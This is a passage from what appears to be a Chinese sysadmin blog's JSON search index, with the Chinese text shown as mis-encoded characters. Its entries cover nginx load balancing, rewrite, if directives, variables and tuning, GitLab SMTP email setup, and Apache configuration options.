upstreamåŒºå—ç‰¹æ®ŠæŒ‡ä»¤å’Œç”¨æ³•ï¼š upstreamï¼šå®šä¹‰é›†ç¾¤ä¿¡æ¯ serverï¼šå®šä¹‰é›†ç¾¤èŠ‚ç‚¹ï¼ˆå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‚æ•°ï¼‰ max_failsï¼šè¿æ¥å¤±è´¥ï¼Œé‡è¯•æ¬¡æ•°ï¼ˆé»˜è®¤1ï¼‰ fail_timeoutï¼šé‡æ–°æ£€æŸ¥é—´éš”æ—¶é—´(é»˜è®¤10s),å¤±è´¥æŒ‡å®šæ¬¡æ•°(max_fails)å,é—´éš”(fail_timeout)æ—¶é—´å,é‡è¯•1æ¬¡ï¼Œå¤±è´¥åˆ™ç»“æŸ.(æˆåŠŸåä¸‹æ¬¡æ£€æµ‹è¿˜æ˜¯3æ¬¡æœºä¼š) backupï¼šçƒ­å¤‡ï¼Œæ‰€æœ‰èŠ‚ç‚¹ä¸èƒ½è®¿é—®æ—¶ï¼Œä½¿ç”¨backup weightï¼šè®¾ç½®è½®è¯¢æƒé‡(åˆ†é…æ¯”ä¾‹) ip_hashï¼šåŒä¸€ä¸ªç”¨æˆ·è®¿é—®ï¼Œåˆ†é…åˆ°åŒä¸€å°æœåŠ¡å™¨ï¼Œå¯ä»¥è§£å†³sessioné—®é¢˜ ","date":"2019-09-09 16:46","objectID":"/post/850/:0:0","tags":["nginx"],"title":"nginxè´Ÿè½½å‡è¡¡çš„äº”ç§ç®—æ³•","uri":"/post/850/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å®˜æ–¹æ–‡æ¡£ï¼š http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_next_upstream ä½œç”¨ï¼š å½“åç«¯æœåŠ¡å™¨è¿”å›æŒ‡å®šçš„é”™è¯¯æ—¶ï¼Œå°†è¯·æ±‚ä¼ é€’åˆ°å…¶ä»–æœåŠ¡å™¨ã€‚ errorä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œå‘å…¶ä¼ é€’è¯·æ±‚æˆ–è¯»å–å“åº”å¤´æ—¶å‘ç”Ÿé”™è¯¯; timeoutåœ¨ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œå‘å…¶ä¼ é€’è¯·æ±‚æˆ–è¯»å–å“åº”å¤´æ—¶å‘ç”Ÿè¶…æ—¶; invalid_headeræœåŠ¡å™¨è¿”å›ç©ºçš„æˆ–æ— æ•ˆçš„å“åº”; http_500æœåŠ¡å™¨è¿”å›ä»£ç ä¸º500çš„å“åº”; http_502æœåŠ¡å™¨è¿”å›ä»£ç ä¸º502çš„å“åº”; http_503æœåŠ¡å™¨è¿”å›ä»£ç ä¸º503çš„å“åº”; http_504æœåŠ¡å™¨è¿”å›ä»£ç 504çš„å“åº”; http_403æœåŠ¡å™¨è¿”å›ä»£ç ä¸º403çš„å“åº”; http_404æœåŠ¡å™¨è¿”å›ä»£ç ä¸º404çš„å“åº”; http_429æœåŠ¡å™¨è¿”å›ä»£ç ä¸º429çš„å“åº”; ","date":"2019-09-09 16:36","objectID":"/post/856/:0:0","tags":["nginx"],"title":"nginxè´Ÿè½½å‡è¡¡proxy_next_upstream","uri":"/post/856/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"é…ç½®æ–‡ä»¶ï¼Œæ²¡æœ‰echoæ¨¡å—çš„è¯å¯ä»¥æ”¹æˆreturnæµ‹è¯•ã€‚ server{ listen 80; server_name test.com; access_log /tmp/test_nginx.log main; location /break/ { rewrite /break/(.*) /break/test/$1 break; location /break/test/ { echo \"break-test\"; } echo \"break\"; } location /last/ { rewrite /last/(.*) /test/$1 last; echo \"last\"; } location /test/ { echo \"test\"; } } è®¿é—®ç»“æœ 1.http://test.com/break/a.txt -\u003ebreak 2.http://test.com/last/a.txt -\u003etest 3.http://test.com/test/a.txt -\u003etest ç»“è®ºï¼š lastï¼šä¿®æ”¹uriåï¼Œæ ¹æ®é‡å†™åçš„è§„åˆ™ï¼Œé‡æ–°å‘èµ·ä¸€ä¸ªå†…éƒ¨è¯·æ±‚ï¼Œè·³è½¬åˆ°å…¶ä»–locationã€‚ breakï¼šä¿®æ”¹uriåï¼Œåœ¨å½“å‰å­—æ®µç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œä½†ä¸ä¼šåŒ¹é…å…¶ä»–locationã€‚ ","date":"2019-09-09 15:34","objectID":"/post/845/:0:0","tags":["nginx"],"title":"nginxçš„rewriteä¸­breakå’ŒlaståŒºåˆ«","uri":"/post/845/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ifæŒ‡ä»¤ç”¨äºåˆ¤æ–­ä¸€ä¸ªæ¡ä»¶ï¼Œå¦‚æœæ¡ä»¶æˆç«‹ï¼Œåˆ™åé¢çš„å¤§æ‹¬å·å†…çš„è¯­å¥å°†æ‰§è¡Œ è¯­æ³•ï¼šif (condition) { â€¦ } é»˜è®¤å€¼ï¼šnone ä½¿ç”¨å­—æ®µï¼šserver, location åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒifæŒ‡ä»¤é»˜è®¤å€¼ä¸ºç©ºï¼Œå¯åœ¨nginxé…ç½®æ–‡ä»¶çš„serverã€locationéƒ¨åˆ†ä½¿ç”¨ï¼Œå¦å¤–ï¼ŒifæŒ‡ä»¤å¯ä»¥åœ¨åˆ¤æ–­è¯­å¥ä¸­æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼æˆ–é€šè¿‡nginxå†…ç½®å˜é‡åŒ¹é…æ¡ä»¶ç­‰ï¼Œç›¸å…³åŒ¹é…æ¡ä»¶å¦‚ä¸‹ï¼š æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…è§„åˆ™ï¼š ~ è¡¨ç¤ºåŒºåˆ†å¤§å°å†™åŒ¹é… ~* è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™åŒ¹é… !~å’Œ!~*åˆ†åˆ«è¡¨ç¤ºåŒºåˆ†å¤§å°å†™ä¸åŒ¹é…åŠä¸åŒºåˆ†å¤§å°å†™ä¸åŒ¹é… æ–‡ä»¶åŠç›®å½•åŒ¹é…ï¼š -få’Œ!-fç”¨æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ–‡ä»¶ -då’Œ!-dç”¨æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç›®å½• -eå’Œ!-eç”¨æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ–‡ä»¶æˆ–ç›®å½• -xå’Œ!-xç”¨æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œ ä¸¾ä¾‹åˆ¤æ–­æµè§ˆå™¨UAï¼š if ($http_user_agent ~* mac) { return 404; } ","date":"2019-09-09 13:08","objectID":"/post/837/:0:0","tags":["nginx"],"title":"nginxä¸­ifæŒ‡ä»¤çš„ä½¿ç”¨","uri":"/post/837/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"Â $args #URLä¸­çš„å‚æ•° $document_root #å½“å‰è¯·æ±‚çš„rootæŒ‡ä»¤æŒ‡å®šçš„å€¼(ç«™ç‚¹ç›®å½•) $uri #è¡¨ç¤ºä¸å¸¦è¯·æ±‚å‚æ•°çš„å½“å‰URIï¼Œ$uriä¸åŒ…å«ä¸»æœºåã€‚ $document_uri #æ­¤å˜é‡ä¸$uriå«ä¹‰ä¸€æ ·ã€‚ $host #æ­¤å˜é‡ä¸è¯·æ±‚å¤´éƒ¨ä¸­â€œHostâ€è¡ŒæŒ‡å®šçš„å€¼ä¸€è‡´ã€‚ $limit_rate #æ­¤å˜é‡ç”¨æ¥è®¾ç½®é™åˆ¶è¿æ¥çš„é€Ÿç‡ã€‚ $request_method #æ­¤å˜é‡ç­‰åŒäºrequestçš„methodï¼Œé€šå¸¸æ˜¯â€œGETâ€æˆ–â€œPOSTâ€ã€‚ $remote_addr #æ­¤å˜é‡è¡¨ç¤ºå®¢æˆ·ç«¯IPåœ°å€ã€‚ $remote_port #æ­¤å˜é‡è¡¨ç¤ºå®¢æˆ·ç«¯ç«¯å£ã€‚ $remote_user #æ­¤å˜é‡ç­‰åŒäºç”¨æˆ·åï¼Œç”±ngx_http_auth_basic_moduleè®¤è¯ã€‚ $request_filename #æ­¤å˜é‡è¡¨ç¤ºå½“å‰è¯·æ±‚çš„æ–‡ä»¶çš„è·¯å¾„åï¼Œç”±rootæˆ–aliaså’ŒURI requestç»„åˆè€Œæˆã€‚ $request_uri #æ­¤å˜é‡è¡¨ç¤ºå«æœ‰å‚æ•°çš„å®Œæ•´çš„åˆå§‹URIã€‚ $query_string #æ­¤å˜é‡ä¸$argså«ä¹‰ä¸€è‡´ã€‚ $server_addrÂ #è¡¨ç¤ºè¯·æ±‚çš„æœåŠ¡å™¨åœ°å€ã€‚ $server_name #æœåŠ¡å™¨çš„ä¸»æœºå $server_port #æœåŠ¡å™¨çš„ç«¯å£å· $request_uriÂ #åŒ…å«è¯·æ±‚å‚æ•°çš„åŸå§‹URIï¼Œä¸åŒ…å«ä¸»æœºåï¼Œç”±å®¢æˆ·ç«¯è¯·æ±‚å†³å®šï¼Œä¸èƒ½ä¿®æ”¹ã€‚ ä»¥http://10.0.0.20:8080/abc?test=123\u0026test2=abc ä¸ºä¾‹å­: å…¶ä¸­ï¼š $argsï¼štest=123\u0026test2=abc $uriï¼š /abc $server_addrï¼š10.0.0.20 $server_portï¼š8080 $request_filenameï¼šabc $request_uriï¼š/abc?test=123\u0026test2=abc ä¾‹2ï¼šhttp://xxx.com:88/test1/test2/test.php ï¼Œå‡å®šè™šæ‹Ÿä¸»æœºæ ¹ç›®å½•ä¸º/var/www/html å…¶ä¸­ï¼š $hostï¼šxxx.com $server_portï¼š88 $request_uriï¼š /test1/test2/test.php $document_uriï¼š/test1/test2/test.php $document_rootï¼š/var/www/html $request_filenameï¼š/var/www/html/test1/test2/test.php ","date":"2019-09-09 11:53","objectID":"/post/829/:0:0","tags":["nginx"],"title":"nginxå¸¸ç”¨å†…ç½®å˜é‡","uri":"/post/829/"},{"categories":["åŸºç¡€å†…å®¹"],"content":" æŒ‡ä»¤ å¿«é€Ÿå…³é—­è¿›ç¨‹ QUIT ä¼˜é›…çš„å…³é—­è¿›ç¨‹ï¼Œå³ç­‰è¯·æ±‚ç»“æŸä¹‹åå†å…³é—­ HUP æ”¹å˜é…ç½®æ–‡ä»¶ä¹‹åã€å¹³æ»‘çš„é‡è¯»é…ç½®æ–‡ä»¶ USR1 åˆ‡å‰²æ—¥å¿— USR2 Nginxå¹³æ»‘çš„å‡çº§ WINCH ä¼˜é›…çš„å…³é—­æ—§è¿›ç¨‹ï¼Œé…åˆUSR2è¿›è¡Œå‡çº§ ","date":"2019-09-06 14:26","objectID":"/post/823/:0:0","tags":[],"title":"killä¿¡å·","uri":"/post/823/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å‚è€ƒï¼šhttps://www.cnblogs.com/cheyunhua/p/10670070.html ä¸€ã€è®¾ç½®è¿›ç¨‹æ•°é‡ worker_processesï¼šè®¾ç½®nginxå·¥ä½œçš„è¿›ç¨‹æ•°ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œè®¾ç½®æˆCPUæ ¸çš„æ•°é‡å³å¯ï¼Œè¿™æ ·å¯ä»¥å……åˆ†åˆ©ç”¨CPUèµ„æº æŸ¥çœ‹CPUæ ¸æ•°ï¼š [root@nginx ]#grep ^processor /proc/cpuinfo | wc â€“l åœ¨nginx1.10ç‰ˆæœ¬åï¼Œworker_processesæŒ‡ä»¤æ–°å¢äº†ä¸€ä¸ªé…ç½®å€¼autoï¼Œå®ƒè¡¨ç¤ºnginxä¼šè‡ªåŠ¨æ£€æµ‹CPUæ ¸æ•°å¹¶æ‰“å¼€ç›¸åŒæ•°é‡çš„workerè¿›ç¨‹ã€‚ äºŒã€CPUäº²å’ŒåŠ›ï¼ˆè¿›ç¨‹ç»‘å®šCPUï¼‰ worker_cpu_affinityï¼šæ­¤æŒ‡ä»¤å¯å°†Nginxå·¥ä½œè¿›ç¨‹ä¸æŒ‡å®šCPUæ ¸ç»‘å®šï¼Œé™ä½ç”±äºå¤šæ ¸CPUåˆ‡æ¢é€ æˆçš„æ€§èƒ½æŸè€—ã€‚ worker_cpu_affinityä½¿ç”¨æ–¹æ³•æ˜¯é€šè¿‡1ã€0æ¥è¡¨ç¤ºçš„ï¼ŒCPUæœ‰å¤šå°‘ä¸ªæ ¸ï¼Ÿå°±æœ‰å‡ ä½æ•°ï¼Œ1ä»£è¡¨å†…æ ¸å¼€å¯ï¼Œ0ä»£è¡¨å†…æ ¸å…³é—­ï¼Œä¾‹å¦‚ï¼šæœ‰ä¸€ä¸ª4æ ¸çš„æœåŠ¡å™¨ï¼Œé‚£ä¹ˆnginxé…ç½®ä¸­worker_processesã€worker_cpu_affinityçš„å†™æ³•å¦‚ä¸‹ï¼š worker_processesÂ 4; worker_cpu_affinity 0001 0010 0100 1000; å››æ ¸ï¼šworker_cpu_affinity 0001 0010 0100 1000; è¿›ç¨‹1â€“\u003e ç»‘å®šç¬¬ä¸€ä¸ªæ ¸å¿ƒ0001 è¿›ç¨‹2â€“\u003e ç»‘å®šç¬¬äºŒä¸ªæ ¸å¿ƒ0010 è¿›ç¨‹3â€“\u003e ç»‘å®šç¬¬ä¸‰ä¸ªæ ¸å¿ƒ0100 è¿›ç¨‹4â€“\u003e ç»‘å®šç¬¬å››ä¸ªæ ¸å¿ƒ1000 å…«æ ¸ï¼šworker_cpu_affinity 00000001 00000010 00000100Â 00001000 00010000Â 00100000 01000000 10000000; è¿›ç¨‹1â€“\u003e ç»‘å®šç¬¬ä¸€ä¸ªæ ¸å¿ƒ00000001 è¿›ç¨‹2â€“\u003e ç»‘å®šç¬¬äºŒä¸ªæ ¸å¿ƒ00000010 è¿›ç¨‹3â€“\u003e ç»‘å®šç¬¬ä¸‰ä¸ªæ ¸å¿ƒ00000100 è¿›ç¨‹4â€“\u003e ç»‘å®šç¬¬å››ä¸ªæ ¸å¿ƒ00001000 è¿›ç¨‹5â€“\u003e ç»‘å®šç¬¬äº”ä¸ªæ ¸å¿ƒ00010000 è¿›ç¨‹6â€“\u003e ç»‘å®šç¬¬å…­ä¸ªæ ¸å¿ƒ00100000 è¿›ç¨‹7â€“\u003e ç»‘å®šç¬¬ä¸ƒä¸ªæ ¸å¿ƒ01000000 è¿›ç¨‹8â€“\u003e ç»‘å®šç¬¬å…«ä¸ªæ ¸å¿ƒ10000000 worker_processesæœ€å¤šå¼€å¯8ä¸ªï¼Œ8ä¸ªä»¥ä¸Šæ€§èƒ½æå‡ä¸ä¼šå†æå‡äº†ï¼Œè€Œä¸”ç¨³å®šæ€§å˜å¾—æ›´ä½ï¼Œæ‰€ä»¥8ä¸ªè¿›ç¨‹å¤Ÿç”¨äº†ã€‚ ä¸‰ã€Nginxæœ€å¤§æ‰“å¼€æ–‡ä»¶æ•° worker_rlimit_nofile 65535; è¿™ä¸ªæŒ‡ä»¤æ˜¯æŒ‡å½“ä¸€ä¸ªnginxè¿›ç¨‹æ‰“å¼€çš„æœ€å¤šæ–‡ä»¶æè¿°ç¬¦æ•°ç›®ï¼Œç†è®ºå€¼åº”è¯¥æ˜¯æœ€å¤šæ‰“å¼€æ–‡ä»¶æ•°ï¼ˆulimit -nï¼‰ä¸nginxè¿›ç¨‹æ•°ç›¸é™¤ï¼Œä½†æ˜¯nginxåˆ†é…è¯·æ±‚å¹¶ä¸æ˜¯é‚£ä¹ˆå‡åŒ€ï¼Œæ‰€ä»¥æœ€å¥½ä¸ulimit -nçš„å€¼ä¿æŒä¸€è‡´ã€‚ æ³¨ï¼šæ–‡ä»¶èµ„æºé™åˆ¶çš„é…ç½®å¯ä»¥åœ¨/etc/security/limits.confè®¾ç½®ï¼Œé’ˆå¯¹root/userç­‰å„ä¸ªç”¨æˆ·æˆ–è€…*ä»£è¡¨æ‰€æœ‰ç”¨æˆ·æ¥è®¾ç½®ã€‚ soft nofile 65535 hard nofile 65535 ç”¨æˆ·é‡æ–°ç™»å½•ç”Ÿæ•ˆï¼ˆulimit -nï¼‰ å››ã€Nginxäº‹ä»¶å¤„ç†æ¨¡å‹ events { use epoll; worker_connections 65535; multi_accept on; } nginxé‡‡ç”¨epolläº‹ä»¶æ¨¡å‹ï¼Œå¤„ç†æ•ˆç‡é«˜ã€‚ work_connectionsæ˜¯å•ä¸ªworkerè¿›ç¨‹å…è®¸å®¢æˆ·ç«¯æœ€å¤§è¿æ¥æ•°ï¼Œè¿™ä¸ªæ•°å€¼ä¸€èˆ¬æ ¹æ®æœåŠ¡å™¨æ€§èƒ½å’Œå†…å­˜æ¥åˆ¶å®šã€‚å®é™…çš„å€¼å°±æ˜¯workerè¿›ç¨‹æ•°ä¹˜ä»¥work_connectionsã€‚ å®é™…æˆ‘ä»¬å¡«å…¥ä¸€ä¸ª65535ï¼Œè¶³å¤Ÿäº†ï¼Œè¿™äº›éƒ½ç®—å¹¶å‘å€¼ï¼Œä¸€ä¸ªç½‘ç«™çš„å¹¶å‘è¾¾åˆ°è¿™ä¹ˆå¤§çš„æ•°é‡ï¼Œä¹Ÿç®—ä¸€ä¸ªå¤§ç«™äº†ï¼ multi_accept å‘Šè¯‰nginxæ”¶åˆ°ä¸€ä¸ªæ–°è¿æ¥é€šçŸ¥åæ¥å—å°½å¯èƒ½å¤šçš„è¿æ¥ï¼Œé»˜è®¤æ˜¯onï¼Œè®¾ç½®ä¸ºonåï¼Œå¤šä¸ªworkeræŒ‰ä¸²è¡Œæ–¹å¼æ¥å¤„ç†è¿æ¥ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªè¿æ¥åªæœ‰ä¸€ä¸ªworkerè¢«å”¤é†’ï¼Œå…¶ä»–çš„å¤„äºä¼‘çœ çŠ¶æ€ï¼Œè®¾ç½®ä¸ºoffåï¼Œå¤šä¸ªworkeræŒ‰å¹¶è¡Œæ–¹å¼æ¥å¤„ç†è¿æ¥ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªè¿æ¥ä¼šå”¤é†’æ‰€æœ‰çš„workerï¼Œç›´åˆ°è¿æ¥åˆ†é…å®Œæ¯•ï¼Œæ²¡æœ‰å–å¾—è¿æ¥çš„ç»§ç»­ä¼‘çœ ã€‚å½“ä½ çš„æœåŠ¡å™¨è¿æ¥æ•°ä¸å¤šæ—¶ï¼Œå¼€å¯è¿™ä¸ªå‚æ•°ä¼šè®©è´Ÿè½½æœ‰ä¸€å®šçš„é™ä½ï¼Œä½†æ˜¯å½“æœåŠ¡å™¨çš„ååé‡å¾ˆå¤§æ—¶ï¼Œä¸ºäº†æ•ˆç‡ï¼Œå¯ä»¥å…³é—­è¿™ä¸ªå‚æ•°ã€‚ äº”ã€å¼€å¯é«˜æ•ˆä¼ è¾“æ¨¡å¼ http { include mime.types; default_type application/octet-stream; â€¦â€¦ sendfile on; tcp_nopush on; â€¦â€¦ } Include mime.types ï¼š åª’ä½“ç±»å‹,include åªæ˜¯ä¸€ä¸ªåœ¨å½“å‰æ–‡ä»¶ä¸­åŒ…å«å¦ä¸€ä¸ªæ–‡ä»¶å†…å®¹çš„æŒ‡ä»¤ã€‚ default_type application/octet-stream ï¼šé»˜è®¤åª’ä½“ç±»å‹è¶³å¤Ÿã€‚ sendfile onï¼šå¼€å¯é«˜æ•ˆæ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼ŒsendfileæŒ‡ä»¤æŒ‡å®šnginxæ˜¯å¦è°ƒç”¨sendfileå‡½æ•°æ¥è¾“å‡ºæ–‡ä»¶ï¼Œå¯¹äºæ™®é€šåº”ç”¨è®¾ä¸º onï¼Œå¦‚æœç”¨æ¥è¿›è¡Œä¸‹è½½ç­‰åº”ç”¨ç£ç›˜IOé‡è´Ÿè½½åº”ç”¨ï¼Œå¯è®¾ç½®ä¸ºoffï¼Œä»¥å¹³è¡¡ç£ç›˜ä¸ç½‘ç»œI/Oå¤„ç†é€Ÿåº¦ï¼Œé™ä½ç³»ç»Ÿçš„è´Ÿè½½ã€‚æ³¨æ„ï¼šå¦‚æœå›¾ç‰‡æ˜¾ç¤ºä¸æ­£å¸¸æŠŠè¿™ä¸ªæ”¹æˆoffã€‚ tcp_nopush onï¼šå¿…é¡»åœ¨sendfileå¼€å¯æ¨¡å¼æ‰æœ‰æ•ˆï¼Œé˜²æ­¢ç½‘è·¯é˜»å¡ï¼Œç§¯æçš„å‡å°‘ç½‘ç»œæŠ¥æ–‡æ®µçš„æ•°é‡ï¼ˆå°†å“åº”å¤´å’Œæ­£æ–‡çš„å¼€å§‹éƒ¨åˆ†ä¸€èµ·å‘é€ï¼Œè€Œä¸ä¸€ä¸ªæ¥ä¸€ä¸ªçš„å‘é€ã€‚ï¼‰ ","date":"2019-09-05 13:03","objectID":"/post/816/:0:0","tags":["nginx"],"title":"nginxä¼˜åŒ–","uri":"/post/816/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"vim /etc/gitlab/gitlab.rb #52è¡Œå·¦å³ gitlab_rails['gitlab_email_enabled'] = true gitlab_rails['gitlab_email_from'] = 'ä½ çš„é‚®ç®±' gitlab_rails['gitlab_email_display_name'] = 'soulchild-gitlab' #517è¡Œå·¦å³ gitlab_rails['smtp_enable'] = true gitlab_rails['smtp_address'] = \"smtp.qq.com\" gitlab_rails['smtp_port'] = 465 gitlab_rails['smtp_user_name'] = \"ä½ çš„é‚®ç®±\" gitlab_rails['smtp_password'] = \"æˆæƒç \" gitlab_rails['smtp_domain'] = \"qq.com\" gitlab_rails['smtp_authentication'] = \"login\" gitlab_rails['smtp_enable_starttls_auto'] = true gitlab_rails['smtp_tls'] = true #è¿›å…¥æ§åˆ¶å°ï¼ˆéœ€è¦å¤šç­‰ä¸€ä¼šï¼‰ gitlab-rails console irb(main):001:0\u003e Notify.test_email('xxxx@qq.com', 'Message Subject', 'Message Body').deliver_now","date":"2019-08-27 12:10","objectID":"/post/811/:0:0","tags":["gitlab"],"title":"gitlabå‘é€é‚®ä»¶æµ‹è¯•","uri":"/post/811/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"server { access_log logs/blog_access.log main; location / { root /var/www/blog; index index.php index.html index.htm; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } location ~ \\.php$ { root /var/www/blog; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } } ","date":"2019-08-26 15:50","objectID":"/post/807/:0:0","tags":["nginx"],"title":"nginxè™šæ‹Ÿæœºä¸»æœºé…ç½®","uri":"/post/807/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"httpd.confæ–‡ä»¶ ServerRoot \"/usr/local/apache2\" æŒ‡å®šapacheçš„å®‰è£…ç›®å½• Listen 80 è®¾ç½®apacheçš„ç›‘å¬ç«¯å£ LoadModule access_module modules/mod_access.so LoadModule auth_module modules/mod_auth.so LoadModule jk_module modules/mod_jk.so åŠ¨æ€åŠ è½½æ¨¡å—ï¼Œåœ¨å®‰è£…apacheçš„æ—¶å€™æŒ‡å®šäº†åŠ¨æ€åŠ è½½ï¼Œå› æ­¤å°±å¯ä»¥å°†éœ€è¦çš„æ¨¡å—æ”¾åˆ°äº†modulesç›®å½•ä¸‹ï¼Œç„¶ååœ¨è¿™é‡ŒæŒ‡å®šåŠ è½½å³å¯ã€‚ User daemon Group daemon è®¾å®šæ‰§è¡Œhttpdçš„ç”¨æˆ·å’Œç»„ ServerName www.example.com:80 ç”¨äºç»‘å®šåŸŸåä½¿ç”¨ \u003cDirectory /\u003e AllowOverride none Require all denied \u003c/Directory\u003e Directoryä¸€èˆ¬ç”¨äºå¯¹æŒ‡å®šç›®å½•è¿›è¡Œæƒé™æ§åˆ¶ AllowOverride å†³å®šæ˜¯å¦è¯»å–ç›®å½•ä¸­çš„.htaccessæ–‡ä»¶ Allï¼šè¡¨ç¤ºå¯ä»¥è¯»å–.htaccessæ–‡ä»¶çš„å†…å®¹ï¼Œä¿®æ”¹åŸæ¥çš„è®¿é—®æƒé™ã€‚ Noneï¼šè¡¨ç¤ºä¸è¯»å–.htaccessæ–‡ä»¶ï¼Œæƒé™ç”±httpd.confç»Ÿä¸€æ§åˆ¶ã€‚ Require all deniedï¼šè¡¨ç¤ºç¦æ­¢æ‰€æœ‰è¯·æ±‚è®¿é—®èµ„æºï¼Œæ­¤é…ç½®è¡¨ç¤ºç¦æ­¢è®¿é—®webæœåŠ¡å™¨çš„ä»»ä½•ç›®å½• Require all grantedï¼šè¡¨ç¤ºå…è®¸æ‰€æœ‰è¯·æ±‚è®¿é—®èµ„æºã€‚Requireæ˜¯apache2.4ç‰ˆæœ¬çš„ä¸€ä¸ªæ–°ç‰¹æ€§ Require ip IPåœ°å€ï¼šå…è®¸æŸä¸ªIPè®¿é—® Require not ip IPåœ°å€ï¼šæ‹’ç»æŸä¸ªIPè®¿é—® Require host ä¸»æœºåï¼šå…è®¸æŸä¸ªä¸»æœºè®¿é—® Require not host ä¸»æœºåï¼šæ‹’ç»æŸä¸ªä¸»æœºè®¿é—® DocumentRoot \"/usr/local/apache2/htdocs\" è®¾ç½®ç«™ç‚¹ç›®å½•ä½ç½® \u003cDirectory \"/usr/local/apache2/htdocs\"\u003e Options Indexes FollowSymLinks AllowOverride None Require all granted \u003c/Directory\u003e OptionsÂ è¡¨ç¤ºåœ¨è¿™ä¸ªç›®å½•å†…èƒ½å¤Ÿæ‰§è¡Œçš„æ“ä½œï¼Œä¸»è¦æœ‰4ä¸ªå¯è®¾å®šçš„å€¼ï¼š Indexesï¼šæ­¤å‚æ•°è¡¨ç¤ºå¦‚æœåœ¨DocumentRootæŒ‡å®šç›®å½•ä¸‹æ‰¾ä¸åˆ°ç´¢å¼•æ–‡ä»¶æ—¶ï¼Œå°±å°†æ­¤ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶åˆ—å‡ºæ¥ã€‚ FollowSymLinksï¼šè¡¨ç¤ºåœ¨DocumentRootæŒ‡å®šç›®å½•ä¸‹å…è®¸ç¬¦å·é“¾æ¥åˆ°å…¶å®ƒç›®å½•ã€‚ ExecCGIï¼šè¡¨ç¤ºå…è®¸åœ¨DocumentRootæŒ‡å®šçš„ç›®å½•ä¸‹æ‰§è¡Œcgiæ“ä½œã€‚ ","date":"2019-08-26 11:19","objectID":"/post/800/:1:0","tags":["apache"],"title":"apacheé…ç½®æ–‡ä»¶å¸¸ç”¨é…ç½®é¡¹è¯´æ˜","uri":"/post/800/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"httpd-default.conf Timeout 300 Timeoutç”¨æ¥å®šä¹‰å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ç¨‹åºè¿æ¥çš„è¶…æ—¶é—´éš”ï¼Œå•ä½ä¸ºç§’ï¼Œè¶…è¿‡è¿™ä¸ªæ—¶é—´é—´éš”ï¼ŒæœåŠ¡å™¨å°†æ–­å¼€ä¸å®¢æˆ·ç«¯çš„è¿æ¥ã€‚ KeepAlive On KeepAliveç”¨æ¥å®šä¹‰æ˜¯å¦å…è®¸ç”¨æˆ·å»ºç«‹æ°¸ä¹…è¿æ¥ï¼ŒOnä¸ºå…è®¸å»ºç«‹æ°¸ä¹…è¿æ¥ï¼ŒOffè¡¨ç¤ºæ‹’ç»ç”¨æˆ·å»ºç«‹æ°¸ä¹…è¿æ¥ï¼Œå»ºè®®æ­¤é€‰é¡¹è®¾ç½®ä¸ºOn MaxKeepAliveRequests 100 MaxKeepAliveRequestsç”¨æ¥å®šä¹‰ä¸€ä¸ªtcpè¿æ¥å¯ä»¥è¿›è¡ŒHTTPè¯·æ±‚çš„æœ€å¤§æ¬¡æ•°ï¼Œè®¾ç½®ä¸º0ä»£è¡¨ä¸é™åˆ¶è¯·æ±‚æ¬¡æ•°ï¼Œè¿™ä¸ªé€‰é¡¹ä¸ä¸Šé¢çš„KeepAliveç›¸äº’å…³è”ï¼Œå½“KeepAliveè®¾å®šä¸ºOnï¼Œè¿™ä¸ªè®¾ç½®å¼€å§‹èµ·ä½œç”¨ã€‚ KeepAliveTimeout 15 KeepAliveTimeoutç”¨æ¥é™å®šä¸€æ¬¡è¿æ¥ä¸­æœ€åä¸€æ¬¡è¯·æ±‚å®Œæˆåçš„ç­‰å¾…æ—¶é—´ï¼Œå¦‚æœè¶…è¿‡äº†è¿™ä¸ªç­‰å¾…æ—¶é—´ï¼ŒæœåŠ¡å™¨å°±æ–­å¼€è¿æ¥ã€‚ ServerTokens Prod ServerTokenså¯ä»¥ç”¨æ¥ç¦æ­¢æ˜¾ç¤ºæˆ–å‘é€Apacheç‰ˆæœ¬å·ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨HTTPå“åº”å¤´ä¼šåŒ…å«apacheå’Œphpç‰ˆæœ¬å·ã€‚ å‡å®šapacheç‰ˆæœ¬ä¸ºApache/2.4.29ï¼ŒPHPç‰ˆæœ¬ä¸ºPHP/7.1.14ï¼Œé‚£ä¹ˆServerTokenså¯é€‰çš„çš„èµ‹å€¼è¿˜æœ‰å¦‚ä¸‹å‡ ä¸ªï¼š ServerTokens Prod ä¼šæ˜¾ç¤ºâ€œServer: Apacheâ€ ServerTokens Major ä¼šæ˜¾ç¤º â€œServer: Apache/2â€³ ServerTokens Minor ä¼šæ˜¾ç¤ºâ€œServer: Apache/2.4â€³ ServerTokens Min ä¼šæ˜¾ç¤ºâ€œServer: Apache/2.4.29â€³ ServerTokens OS ä¼šæ˜¾ç¤º â€œServer: Apache/2.4.29 (Unix)â€ ServerTokens Full ä¼šæ˜¾ç¤º 